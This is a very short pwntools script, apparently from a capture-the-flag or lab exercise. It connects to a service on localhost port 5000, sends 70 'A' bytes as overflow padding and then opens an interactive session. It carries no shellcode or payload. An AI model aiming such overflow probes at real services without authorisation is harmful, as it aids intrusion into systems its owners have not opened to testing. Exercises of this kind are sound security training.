from pwn import *

r = remote('localhost', 5000)

r.sendline(b'A'*70)

r.interactive()
